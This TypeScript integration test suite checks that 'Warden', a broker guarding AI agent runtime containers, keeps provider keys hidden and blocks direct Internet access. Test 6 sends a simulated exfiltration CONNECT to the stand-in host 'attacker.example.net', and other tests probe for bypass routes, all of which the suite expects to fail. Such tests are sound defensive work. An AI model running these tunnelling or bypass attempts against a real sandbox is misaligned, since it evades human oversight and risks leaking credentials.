import { execFile } from "node:child_process";
import { createServer, type Server } from "node:http";
import { randomBytes } from "node:crypto";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { RemoteWardenControl } from "./control-client.js";

const execFileAsync = promisify(execFile);

/**
 * The test that proves the invariant instead of asserting it.
 *
 * It boots the REAL topology — two networks, the real broker container, a fake
 * Ark upstream — and drives it from a real Runtime-like container placed on the
 * internal network exactly as an Agent Runtime would be.
 *
 * Every other test verifies that Warden DECIDES correctly. This one verifies
 * that a Runtime CANNOT GO AROUND IT.
 *
 * Skipped unless WARDEN_DOCKER_TESTS=1 so `npm run check` stays green without a
 * container engine.
 */
const ENGINE = process.env.CONTAINER_ENGINE ?? "docker";
const IMAGE = process.env.WARDEN_TEST_IMAGE ?? "node:22-bookworm-slim";
const SUFFIX = randomBytes(4).toString("hex");
const INTERNAL = "warden-itest-internal-" + SUFFIX;
const EGRESS = "warden-itest-egress-" + SUFFIX;
const BROKER = "warden-itest-broker-" + SUFFIX;
const ALIAS = "warden-broker";
const GATEWAY_PORT = 8788;
const CONTROL_PORT = 18789;
const FAKE_ARK_PORT = 18790;
const SECRET = randomBytes(16).toString("hex");
const REAL_KEY = "ark_live_integration_only_" + randomBytes(6).toString("hex");

const distDir = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../../dist");

async function sh(
  args: string[],
  timeout = 60_000,
  env?: NodeJS.ProcessEnv | undefined,
): Promise<string> {
  // `--env NAME` is the passthrough form: the value must be present in the
  // environment of the container-engine child, and `docker create` resolves it
  // at CREATE time. Supplying it to `docker start` is too late.
  const { stdout } = await execFileAsync(ENGINE, args, {
    timeout,
    ...(env ? { env } : {}),
  });
  return stdout.trim();
}
async function quiet(args: string[]): Promise<void> {
  await sh(args, 30_000).catch(() => undefined);
}

async function available(): Promise<boolean> {
  if (process.env.WARDEN_DOCKER_TESTS !== "1") return false;
  try {
    await execFileAsync(ENGINE, ["info"], { timeout: 10_000 });
    return true;
  } catch {
    return false;
  }
}
const enabled = await available();

/** Runs a script inside a container placed on the internal network, as a Runtime is. */
async function inRuntime(script: string, env: Record<string, string> = {}): Promise<string> {
  const args = [
    "run", "--rm", "--network", INTERNAL, "--cap-drop", "ALL",
    ...Object.entries(env).flatMap(([key, value]) => ["--env", key + "=" + value]),
    IMAGE, "node", "-e", script,
  ];
  const { stdout, stderr } = await execFileAsync(ENGINE, args, { timeout: 60_000 })
    .catch((error: { stdout?: string; stderr?: string }) => ({
      stdout: error.stdout ?? "",
      stderr: error.stderr ?? "",
    }));
  return (stdout + stderr).trim();
}

describe.skipIf(!enabled)("Warden live topology", () => {
  let fakeArk: Server;
  let seenAuthorization: string | undefined;
  let control: RemoteWardenControl;

  beforeAll(async () => {
    // Fake Ark on the host, reachable from the broker's egress network.
    fakeArk = createServer((request, response) => {
      seenAuthorization = request.headers.authorization;
      response.writeHead(200, { "content-type": "application/json" });
      response.end(JSON.stringify({ ok: true, usage: { total_tokens: 42 } }));
    });
    await new Promise<void>((resolve) => fakeArk.listen(FAKE_ARK_PORT, "0.0.0.0", resolve));

    await quiet(["network", "rm", INTERNAL]);
    await quiet(["network", "rm", EGRESS]);
    await sh(["network", "create", "--driver", "bridge", "--internal", INTERNAL]);
    await sh(["network", "create", "--driver", "bridge", EGRESS]);
    await sh(["pull", IMAGE], 300_000).catch(() => undefined);

    const environment: Record<string, string> = {
      ARK_API_KEY: REAL_KEY,
      WARDEN_UPSTREAM_BASE_URL: "http://host.docker.internal:" + FAKE_ARK_PORT + "/api/v3",
      WARDEN_CONTROL_SECRET: SECRET,
      WARDEN_PORT: String(GATEWAY_PORT),
      WARDEN_CONTROL_PORT: String(CONTROL_PORT),
      WARDEN_BROKER_HOST: ALIAS,
      WARDEN_ALLOWED_NETWORK_HOSTS: "example.com:443",
      WARDEN_MAX_MODEL_CALLS: "20",
    };

    await quiet(["rm", "--force", BROKER]);
    await sh([
      "create", "--name", BROKER, "--network", EGRESS,
      "--publish", "127.0.0.1:" + CONTROL_PORT + ":" + CONTROL_PORT,
      "--add-host", "host.docker.internal:host-gateway",
      ...Object.keys(environment).flatMap((name) => ["--env", name]),
      "--workdir", "/warden", IMAGE, "node", "/warden/warden/broker-main.js",
    ], 60_000, { ...process.env, ...environment });
    await execFileAsync(ENGINE, ["cp", distDir + "/.", BROKER + ":/warden/"], { timeout: 120_000 });
    await sh(["network", "connect", "--alias", ALIAS, INTERNAL, BROKER]);
    await sh(["start", BROKER], 30_000);

    control = new RemoteWardenControl("http://127.0.0.1:" + CONTROL_PORT, SECRET);
    const deadline = Date.now() + 40_000;
    while (Date.now() < deadline && !(await control.health())) {
      await new Promise((resolve) => setTimeout(resolve, 500));
    }
  }, 420_000);

  afterAll(async () => {
    await quiet(["rm", "--force", BROKER]);
    await quiet(["network", "rm", INTERNAL]);
    await quiet(["network", "rm", EGRESS]);
    await new Promise<void>((resolve) => fakeArk.close(() => resolve()));
  }, 120_000);

  const beginRun = (runId: string) =>
    control.beginRun({
      agentId: "agent-itest",
      runId,
      traceId: "trace-" + runId,
      humanPrincipal: { kind: "human", id: "user:itest", displayName: "Integration" },
      agentPrincipal: { kind: "agent", id: "agent:agent-itest", displayName: "Agent" },
      workspacePath: "/workspace",
    });

  it("1. the broker becomes healthy on the real topology", async () => {
    expect(await control.health()).toBe(true);
    expect((await control.status()).ok).toBe(true);
  });

  it("2. the Runtime holds a grant, never the provider key", async () => {
    const { grant, token } = await beginRun("run-env");
    const output = await inRuntime(
      "console.log(JSON.stringify({k:process.env.ARK_API_KEY}))",
      { ARK_API_KEY: token },
    );
    expect(output).toContain("wgt_");
    expect(output).not.toContain(REAL_KEY);
    expect(grant.tokenFingerprint).toHaveLength(8);
  });

  it("3+4. a real Runtime model call succeeds and the broker substitutes the real key", async () => {
    const { token } = await beginRun("run-model");
    seenAuthorization = undefined;
    const output = await inRuntime(
      `const r = await fetch("http://${ALIAS}:${GATEWAY_PORT}/v1/responses",` +
        `{method:"POST",headers:{authorization:"Bearer "+process.env.T,"content-type":"application/json"},body:"{}"});` +
        `console.log("STATUS="+r.status+" BODY="+await r.text());`,
      { T: token },
    );
    expect(output).toContain("STATUS=200");
    expect(seenAuthorization).toBe("Bearer " + REAL_KEY);
  });

  it("4b. the Runtime cannot bypass Warden by reaching the Internet directly", async () => {
    // By address, so this tests ROUTING rather than DNS. This is the headline
    // claim of the invariant and it belongs in the test suite, not just prose.
    const output = await inRuntime(
      `const net=require("node:net");` +
        `const s=net.connect({host:"1.1.1.1",port:443,timeout:5000});` +
        `s.on("connect",()=>{console.log("REACHED");s.destroy()});` +
        `s.on("timeout",()=>{console.log("BLOCKED");s.destroy()});` +
        `s.on("error",()=>console.log("BLOCKED"));`,
    );
    expect(output).toContain("BLOCKED");
    expect(output).not.toContain("REACHED");
  });

  it("5. a forged grant is refused", async () => {
    const output = await inRuntime(
      `const r = await fetch("http://${ALIAS}:${GATEWAY_PORT}/v1/responses",` +
        `{method:"POST",headers:{authorization:"Bearer wgt_forged"},body:"{}"});` +
        `console.log("STATUS="+r.status+" "+await r.text());`,
    );
    expect(output).toContain("STATUS=403");
    expect(output).toContain("no_grant");
  });

  it("6. a disallowed CONNECT is denied and recorded in the trace", async () => {
    const { token, grant } = await beginRun("run-exfil");
    const output = await inRuntime(
      `const net=require("node:net");const s=net.connect(${GATEWAY_PORT},"${ALIAS}",()=>{` +
        `s.write("CONNECT attacker.example.net:443 HTTP/1.1\\r\\nProxy-Authorization: Bearer "+process.env.T+"\\r\\n\\r\\n")});` +
        `let b="";s.on("data",c=>b+=c);s.on("close",()=>console.log(b));`,
      { T: token },
    );
    expect(output).toContain("403");
    expect(output).toContain("host_not_allowed");
    const trace = await control.getTrace(grant.traceId);
    expect(trace?.spans.some((span) => span.status === "denied")).toBe(true);
  });

  it("7. the provider surface outside inference is refused", async () => {
    const { token } = await beginRun("run-path");
    const output = await inRuntime(
      `const r = await fetch("http://${ALIAS}:${GATEWAY_PORT}/v1/files",` +
        `{method:"POST",headers:{authorization:"Bearer "+process.env.T},body:"{}"});` +
        `console.log("STATUS="+r.status+" "+await r.text());`,
      { T: token },
    );
    expect(output).toContain("path_not_allowed");
  });

  it("8. the control API is unreachable from the Runtime", async () => {
    // Against the broker's own alias, not the Runtime's loopback.
    const output = await inRuntime(
      `const net=require("node:net");const s=net.connect({host:"${ALIAS}",port:${CONTROL_PORT},timeout:5000});` +
        `s.on("connect",()=>{console.log("REACHED");s.destroy()});` +
        `s.on("timeout",()=>{console.log("BLOCKED");s.destroy()});` +
        `s.on("error",e=>console.log("BLOCKED "+e.code));`,
    );
    expect(output).toContain("BLOCKED");
    expect(output).not.toContain("REACHED");
  });

  it("9. revocation tears down a tunnel that is already open", async () => {
    const { token, grant } = await beginRun("run-teardown");
    // example.com:443 is allowlisted, so the tunnel opens for real.
    const script =
      `const net=require("node:net");const s=net.connect(${GATEWAY_PORT},"${ALIAS}",()=>{` +
      `s.write("CONNECT example.com:443 HTTP/1.1\\r\\nProxy-Authorization: Bearer "+process.env.T+"\\r\\n\\r\\n")});` +
      `let opened=false;s.on("data",c=>{if(String(c).includes("200")){opened=true;console.log("TUNNEL_OPEN")}});` +
      `s.on("close",()=>console.log(opened?"TUNNEL_CLOSED":"NEVER_OPENED"));setTimeout(()=>{},15000);`;
    const runtime = execFileAsync(ENGINE, [
      "run", "--rm", "--network", INTERNAL, "--env", "T=" + token, IMAGE, "node", "-e", script,
    ], { timeout: 60_000 }).catch((error: { stdout?: string }) => ({ stdout: error.stdout ?? "" }));
    await new Promise((resolve) => setTimeout(resolve, 6_000));
    await control.revokeGrant(grant.id, "integration teardown");
    const { stdout } = await runtime;
    expect(stdout).toContain("TUNNEL_OPEN");
    expect(stdout).toContain("TUNNEL_CLOSED");
  }, 120_000);

  it("10. revoking an old grant does not disturb a newer run", async () => {
    const older = await beginRun("run-older");
    await control.endRun({
      traceId: older.grant.traceId,
      grantId: older.grant.id,
      runSpanId: older.runSpanId,
      status: "ok",
    });
    const newer = await beginRun("run-newer");
    await control.revokeGrant(older.grant.id, "stale revocation");
    // The newer grant is untouched and still authorises a model call.
    const output = await inRuntime(
      `const r = await fetch("http://${ALIAS}:${GATEWAY_PORT}/v1/responses",` +
        `{method:"POST",headers:{authorization:"Bearer "+process.env.T},body:"{}"});` +
        `console.log("STATUS="+r.status);`,
      { T: newer.token },
    );
    expect(output).toContain("STATUS=200");
    expect((await control.getGrant(newer.grant.id))?.status).toBe("active");
  });
});